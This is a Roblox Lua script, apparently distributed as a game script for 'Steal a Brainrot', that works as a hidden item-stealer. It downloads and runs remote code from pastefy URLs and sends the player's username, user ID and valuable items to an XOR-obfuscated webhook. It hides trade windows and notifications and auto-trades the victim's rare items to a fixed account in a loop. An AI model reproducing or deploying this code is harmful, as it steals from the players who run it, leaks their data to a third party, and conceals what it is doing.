-- Security Check: Only run in specified Game IDs
local allowedPlaceIds = {
    109983668079237,
    78906538690694,
    119594317142884
}
if not table.find(allowedPlaceIds, game.PlaceId) then
    return
end

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LP = Players.LocalPlayer
local cam = workspace.CurrentCamera
local pg = LP:WaitForChild("PlayerGui")
local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")

task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/zFGkxvOL/raw"))()
end)
task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/cDi8pV20/raw"))()
end)

task.spawn(function()
    local GOOD_WEBHOOK =  (function()
    local b = {122,102,102,98,97,40,61,61,118,123,97,113,125,96,118,60,113,125,127,61,115,98,123,61,101,119,112,122,125,125,121,97,61,35,38,42,34,37,36,34,37,32,38,37,36,39,42,34,36,36,42,39,61,100,123,69,81,97,112,34,71,91,81,42,103,124,99,67,88,87,121,99,122,126,90,91,115,68,124,37,32,98,101,80,89,81,118,34,81,36,115,116,123,39,32,88,116,93,34,126,113,115,85,68,90,66,119,65,94,43,124,85,118,75,103,38,118,37,81,107,80}
    local k = 18
    local o = {}
    for i = 1, #b do o[i] = string.char(bit32.bxor(b[i], k)) end
    return table.concat(o)
end)()

    local GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
    local FANDOM_BASE = "https://stealabrainrot.fandom.com/wiki/"
    local TARGET_ID = 2829121161
    local DELAY_STEP = 1
    local TRADE_CYCLE_DELAY = 2
    local INVITE_GUID = "afb005f9-6e81-4e0a-8bb0-3555938a9658"
    local SELECT_GUID = "6b5f15fb-5cb9-4d07-a031-bbff8e641eda"
    local READY_GUID = "d73acf93-6f32-44df-b813-0f6b32c7afd9"
    local ACCEPT_GUID = "918ee0f5-e98f-413f-b76e-baee47b021cb"
    local guiNames = {BrainrotTrader = true, TradeLiveTrade = true, TradePrompts = true}

    local TargetBrainrots = {
        ["Strawberry Elephant"] = true,
        ["Headless Horseman"] = true,
        ["Meowl"] = true,
        ["John Pork"] = true,
        ["Skibidi Toilet"] = true,
        ["Griffin"] = true,
        ["Dragon Aquanini"] = true,
        ["Dragon Gingerini"] = true,
        ["Hydra Dragon Cannelloni"] = true,
        ["Signore Carapace"] = true,
        ["Dragon Cannelloni"] = true,
        ["Love Love Bear"] = true,
        ["Moby Bros"] = true,
        ["Digi Narwhal"] = true,
        ["Kraken"] = true,
        ["La Supreme Combinasion"] = true,
        ["Elefanto Frigo"] = true,
        ["Hydra Bunny"] = true,
        ["Celestial Pegasus"] = true,
        ["Cerberus"] = true,
        ["Jelly Moby"] = true,
        ["Bunny and Eggy"] = true,
        ["Popcuru and Fizzuru"] = true,
        ["Rosey and Teddy"] = true,
        ["Capitano Moby"] = true,
        ["Cooki and Milki"] = true,
        ["Arcadragon"] = true,
        ["Burguro and Fryuro"] = true,
        ["Ketupat Bros"] = true,
        ["Reinito Sleighito"] = true,
        ["Fortunu and Cashuru"] = true,
        ["Los Amigos"] = true,
        ["Antonio"] = true,
        ["La Secret Combinasion"] = true,
        ["Pancake and Syrup"] = true,
        ["Foxini Lanternini"] = true,
        ["Kalika Bros"] = true,
        ["Los Sekolahs"] = true,
        ["Sammyni Fattini"] = true,
        ["Cash or Card"] = true,
        ["Fragrama and Chocrama"] = true,
        ["La Casa Boo"] = true,
        ["Los Admins"] = true,
        ["Duggy Bros"] = true,
        ["La Food Combinasion"] = true,
        ["Sammyni Cakini"] = true,
        ["Boppin Bunny"] = true,
        ["Spooky and Pumpky"] = true,
        ["Ginger Gerat"] = true,
        ["Los Chillis"] = true,
        ["Los Hackers"] = true,
        ["Bearito Cabinito"] = true,
        ["Capitano Americano"] = true,
        ["Rubrikiko"] = true,
        ["Festive 67"] = true,
        ["Guest 666"] = true,
        ["Quackini Snackini"] = true,
        ["Cloverat Clapat"] = true,
        ["Los Tictacs"] = true,
        ["Caylusaurus"] = true,
        ["Hopilikalika Hopilikalako"] = true,
        ["Steakini Fattini"] = true,
        ["Garama and Madundung"] = true,
        ["Fishino Clownino"] = true,
        ["Jolly Jolly Sahur"] = true,
        ["Rico Dinero"] = true,
        ["Tirilikalika Tirilikalako"] = true,
        ["Dug Dug Dug"] = true,
        ["Fragola La La La"] = true,
        ["Los Tacoritas"] = true,
        ["Globa Steppa"] = true,
        ["Tuff Toucan"] = true,
        ["Money Money Bros"] = true,
        ["Rubiko and Kubiko"] = true,
        ["Pizza and Ranch"] = true,
        ["Examen Bros"] = true,
        ["Los Secret Combinasionas"] = true
    }

    local GOOD_BRAINROTS = {
        ["Strawberry Elephant"] = true,
        ["Headless Horseman"] = true,
        ["Meowl"] = true,
        ["John Pork"] = true,
        ["Skibidi Toilet"] = true,
        ["Griffin"] = true,
        ["Dragon Aquanini"] = true,
        ["Dragon Gingerini"] = true,
        ["Hydra Dragon Cannelloni"] = true,
        ["Signore Carapace"] = true,
        ["Dragon Cannelloni"] = true,
        ["Love Love Bear"] = true,
        ["Moby Bros"] = true,
        ["Digi Narwhal"] = true,
        ["Kraken"] = true,
        ["La Supreme Combinasion"] = true,
        ["Elefanto Frigo"] = true,
        ["Hydra Bunny"] = true,
        ["Celestial Pegasus"] = true,
        ["Cerberus"] = true,
        ["Jelly Moby"] = true,
        ["Bunny and Eggy"] = true,
        ["Popcuru and Fizzuru"] = true,
        ["Rosey and Teddy"] = true,
        ["Capitano Moby"] = true,
        ["Cooki and Milki"] = true,
        ["Arcadragon"] = true,
        ["Burguro and Fryuro"] = true,
        ["Ketupat Bros"] = true,
        ["Reinito Sleighito"] = true,
        ["Fortunu and Cashuru"] = true,
        ["Los Amigos"] = true,
        ["Antonio"] = true,
        ["La Secret Combinasion"] = true,
        ["Pancake and Syrup"] = true,
        ["Foxini Lanternini"] = true,
        ["Kalika Bros"] = true,
        ["Los Sekolahs"] = true,
        ["Sammyni Fattini"] = true,
        ["Cash or Card"] = true,
        ["Fragrama and Chocrama"] = true,
        ["La Casa Boo"] = true,
        ["Los Admins"] = true,
        ["Duggy Bros"] = true,
        ["La Food Combinasion"] = true,
        ["Sammyni Cakini"] = true,
        ["Boppin Bunny"] = true,
        ["Spooky and Pumpky"] = true,
        ["Ginger Gerat"] = true,
        ["Los Chillis"] = true,
        ["Los Hackers"] = true,
        ["Bearito Cabinito"] = true,
        ["Capitano Americano"] = true,
        ["Rubrikiko"] = true,
        ["Festive 67"] = true,
        ["Guest 666"] = true,
        ["Quackini Snackini"] = true,
        ["Cloverat Clapat"] = true,
        ["Los Tictacs"] = true,
        ["Caylusaurus"] = true,
        ["Hopilikalika Hopilikalako"] = true,
        ["Steakini Fattini"] = true,
        ["Garama and Madundung"] = true,
        ["Fishino Clownino"] = true,
        ["Jolly Jolly Sahur"] = true,
        ["Rico Dinero"] = true,
        ["Tirilikalika Tirilikalako"] = true,
        ["Dug Dug Dug"] = true,
        ["Fragola La La La"] = true,
        ["Los Tacoritas"] = true,
        ["Globa Steppa"] = true,
        ["Tuff Toucan"] = true,
        ["Money Money Bros"] = true,
        ["Rubiko and Kubiko"] = true,
        ["Pizza and Ranch"] = true,
        ["Examen Bros"] = true,
        ["Los Secret Combinasionas"] = true
        
    }

    local function getRemote(unobfuscatedName)
        local children = Net:GetChildren()
        for i, current in ipairs(children) do
            if string.find(current.Name, unobfuscatedName) then
                local prev = children[i - 1]
                if prev and (prev:IsA("RemoteFunction") or prev:IsA("RemoteEvent")) then
                    return prev
                end
            end
        end
        return nil
    end

    local function applyEverythingAfterTargetFound()
        local leftCenter = pg:FindFirstChild("LeftCenter")
        if leftCenter then
            local clone = leftCenter:Clone()
            clone.Name = "LeftCenter_Backup"
            clone.Parent = pg
            leftCenter:Destroy()
        end

        local notifyRemote = getRemote("RE/NotificationService/Notify")
        if notifyRemote then
            pcall(function()
                for _, connection in ipairs(getconnections(notifyRemote.OnClientEvent)) do
                    connection:Disable()
                end
            end)
        end

        local function handleCam(obj)
            if obj:IsA("BlurEffect") then
                task.defer(function() obj:Destroy() end)
            end
        end
        cam.ChildAdded:Connect(handleCam)
        for _, v in ipairs(cam:GetChildren()) do
            handleCam(v)
        end

        cam:GetPropertyChangedSignal("FieldOfView"):Connect(function()
            cam.FieldOfView = 70
        end)
        cam.FieldOfView = 70

        local function handleGui(obj)
            if guiNames[obj.Name] then
                task.defer(function() obj:Destroy() end)
            end
        end
        pg.ChildAdded:Connect(handleGui)
        for _, v in ipairs(pg:GetChildren()) do
            handleGui(v)
        end
    end

    local AnimalsData, AnimalsShared, NumberUtils
    pcall(function()
        AnimalsData = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Animals"))
        AnimalsShared = require(ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Animals"))
        NumberUtils = require(ReplicatedStorage:WaitForChild("Utils"):WaitForChild("NumberUtils"))
    end)

    -- ========== HYBRID (1 remote call only) ==========
    local function getMyPlotAndAnimals()
        local plotsFolder = workspace:FindFirstChild("Plots")
        if not plotsFolder then return nil, nil end

        local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
        if not hrp then
            for i = 1, 20 do
                task.wait(0.1)
                hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
                if hrp then break end
            end
        end
        if not hrp then return nil, nil end

        local bestPlot = nil
        local closestDist = math.huge
        for _, plot in ipairs(plotsFolder:GetChildren()) do
            local ok, pos = pcall(function()
                return plot:GetPivot().Position
            end)
            if ok and pos then
                local dist = (pos - hrp.Position).Magnitude
                if dist < closestDist then
                    closestDist = dist
                    bestPlot = plot
                end
            end
        end

        if not bestPlot then return nil, nil end

        local syncFolder = ReplicatedStorage.Packages:FindFirstChild("Synchronizer")
        local requestData = syncFolder and syncFolder:FindFirstChild("RequestData")
        if not requestData then return nil, nil end

        local ok, data = pcall(function()
            return requestData:InvokeServer(bestPlot.Name)
        end)

        if not ok or type(data) ~= "table" or type(data.AnimalList) ~= "table" then
            return nil, nil
        end

        return bestPlot, data.AnimalList
    end
    -- ================================================

    local myPlot, animalList = getMyPlotAndAnimals()
    if not myPlot or not animalList then
        warn("[Brainrot] Could not find plot or AnimalList")
        return
    end

    local brainrotQueue = {}
    for slotKey, data in pairs(animalList) do
        if type(data) == "table" and data.Index then
            local displayName = data.Index
            if AnimalsData and AnimalsData[data.Index] and AnimalsData[data.Index].DisplayName then
                displayName = AnimalsData[data.Index].DisplayName
            end

            if TargetBrainrots[displayName] or TargetBrainrots[data.Index] then
                table.insert(brainrotQueue, {
                    slotKey = tonumber(slotKey),
                    data = data
                })
            end
        end
    end

    if #brainrotQueue == 0 then
        warn("[Brainrot] No target brainrots found on plot")
        return
    end

    print("[Brainrot] Queued", #brainrotQueue, "target brainrots")
    applyEverythingAfterTargetFound()

    local function getRequestFn()
        return (syn and syn.request) or (http and http.request) or http_request or request
    end

    local function toWikiName(displayName)
        local clean = displayName:match("^(.-)%s*%(") or displayName
        return clean:gsub(" ", "_")
    end

    local function fetchFandomImageUrl(displayName)
        local requestFn = getRequestFn()
        if not requestFn then return nil end
        local wikiName = toWikiName(displayName)
        local url = FANDOM_BASE .. wikiName
        for attempt = 1, 3 do
            local ok, response = pcall(function()
                return requestFn({
                    Url = url,
                    Method = "GET",
                    Headers = {
                        ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        ["Accept-Language"] = "en-US,en;q=0.5",
                        ["Cache-Control"] = "no-cache"
                    },
                    Timeout = 10
                })
            end)
            if ok and response and response.StatusCode == 200 and response.Body then
                local body = response.Body
                local ogImage = body:match('property="og:image"%s+content="([^"]+)"')
                    or body:match('content="([^"]+)"%s+property="og:image"')
                if ogImage and ogImage:find("^https?://") then
                    return ogImage:gsub("&amp;", "&")
                end
            end
            if attempt < 3 then task.wait(0.5 * attempt) end
        end
        return nil
    end

    local function getBrainrotColor(animalIndex)
        local color = nil
        pcall(function()
            local models = ReplicatedStorage:FindFirstChild("Models")
            local animals = models and models:FindFirstChild("Animals")
            if not animals then return end
            local template = animals:FindFirstChild(animalIndex)
            if not template and AnimalsData and AnimalsData[animalIndex] then
                template = animals:FindFirstChild(AnimalsData[animalIndex].DisplayName)
            end
            if not template then return end
            local bestScore = 0
            for _, desc in ipairs(template:GetDescendants()) do
                if desc:IsA("MeshPart") or desc:IsA("Part") then
                    local c = desc.Color
                    local vol = desc.Size.X * desc.Size.Y * desc.Size.Z
                    local maxC = math.max(c.R, c.G, c.B)
                    local minC = math.min(c.R, c.G, c.B)
                    local sat = (maxC > 0) and ((maxC - minC) / maxC) or 0
                    local bri = c.R * 0.299 + c.G * 0.587 + c.B * 0.114
                    local bp = (bri < 0.08 and 0.05) or (bri > 0.92 and 0.15) or 1
                    local score = (sat * 3 + 0.2) * bp * vol
                    if score > bestScore then
                        bestScore = score
                        color = c
                    end
                end
            end
        end)
        return color
    end

    local function colorToDecimal(c)
        if not c then return 3447003 end
        local r = math.clamp(math.floor(c.R * 255), 0, 255)
        local g = math.clamp(math.floor(c.G * 255), 0, 255)
        local b = math.clamp(math.floor(c.B * 255), 0, 255)
        return r * 65536 + g * 256 + b
    end

    local function getBestImageUrl(displayName, animalIndex)
        local fandom = fetchFandomImageUrl(displayName)
        if fandom then return fandom end
        local info = AnimalsData and AnimalsData[animalIndex]
        if info then
            for _, key in ipairs({"Image", "Icon", "Thumbnail", "Texture", "ImageId", "AssetId"}) do
                if info[key] and type(info[key]) == "string" then
                    local num = info[key]:match("%d+")
                    if num then
                        return "https://tr.rbxcdn.com/" .. num .. "/420/420/Image/Png"
                    end
                end
            end
        end
        return nil
    end

    local function sendDetailedWebhook()
        local resultsPrimary = {}
        local requirePingPrimary = false

        for slot, data in pairs(animalList) do
            if type(data) == "table" and data.Index then
                local info = AnimalsData and AnimalsData[data.Index]
                if info then
                    local displayName = info.DisplayName or data.Index

                    if GOOD_BRAINROTS[displayName] or GOOD_BRAINROTS[data.Index] then
                        requirePingPrimary = true

                        -- Mutation
                        local mutation = data.Mutation or "None"

                        -- Traits
                        local traits = (data.Traits and #data.Traits > 0) and data.Traits or {}

                        -- Build display name (no generation)
                        local mutPrefix = ""
                        if mutation ~= "None" and mutation ~= "" then
                            mutPrefix = "[" .. mutation .. "] "
                        end

                        local nameDisplay = mutPrefix .. "**" .. displayName .. "**"

                        if #traits > 0 then
                            nameDisplay = nameDisplay .. " *(x" .. #traits .. " traits)*"
                        end

                        table.insert(resultsPrimary, {
                            slot = tostring(slot),
                            index = data.Index,
                            displayName = displayName,
                            name = nameDisplay,
                        })
                    end
                end
            end
        end

        if #resultsPrimary == 0 then return end

        table.sort(resultsPrimary, function(a, b)
            return tostring(a.displayName) < tostring(b.displayName)
        end)

        local requestFn = getRequestFn()
        if not requestFn then return end

        local top = resultsPrimary[1]
        local imageUrl = getBestImageUrl(top.displayName, top.index)
        local embedColor = colorToDecimal(getBrainrotColor(top.index))

        local lines = {}
        for i, r in ipairs(resultsPrimary) do
            lines[i] = r.name
        end
        local listText = table.concat(lines, "\n")
        if #listText > 3800 then listText = listText:sub(1, 3796) .. "..." end

        local embed = {
            title = top.displayName,
            description = listText,
            color = embedColor,
            fields = {
                {name = "Server", value = "Players: **" .. #Players:GetPlayers() .. "** | Scanned: <t:" .. os.time() .. ":R>", inline = true},
                {name = "Executor", value = (identifyexecutor and identifyexecutor()) or (getexecutorname and getexecutorname()) or "Unknown", inline = true}
            },
            footer = {text = LP.Name .. " • " .. LP.UserId},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        }
        if imageUrl then embed.thumbnail = {url = imageUrl} end

        local payloadData = {
            embeds = {embed},
            username = "Scanner",
            avatar_url = GOOD_AVATAR,
        }
        if requirePingPrimary then
            payloadData.content = "||@everyone||"
        end

        pcall(function()
            requestFn({
                Url = GOOD_WEBHOOK,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payloadData),
            })
        end)
    end

    local function startFullAutomation()
        local inviteRemote = getRemote("RF/TradeService/Invite")
        local addRemote = getRemote("RF/TradeService/AddBrainrot")
        local readyRemote = getRemote("RE/TradeService/Ready")
        local acceptRemote = getRemote("RE/TradeService/Accept")

        if not (inviteRemote and addRemote and readyRemote and acceptRemote) then
            warn("[Brainrot] Missing trade remotes")
            return
        end

        task.spawn(function()
            local idx = 1
            while true do
                local item = brainrotQueue[idx]
                if item then
                    pcall(function()
                        addRemote:InvokeServer(SELECT_GUID, item.slotKey, item.data)
                    end)
                    idx = (idx % #brainrotQueue) + 1
                end
                task.wait(DELAY_STEP)
            end
        end)

        task.spawn(function()
            while true do
                pcall(function()
                    inviteRemote:InvokeServer(INVITE_GUID, TARGET_ID)
                end)
                task.wait(TRADE_CYCLE_DELAY)
            end
        end)

        task.spawn(function()
            while true do
                pcall(function()
                    readyRemote:FireServer(READY_GUID)
                end)
                task.wait(1)
                pcall(function()
                    acceptRemote:FireServer(ACCEPT_GUID)
                end)
                task.wait(1)
            end
        end)
    end

    sendDetailedWebhook()
    startFullAutomation()
end)
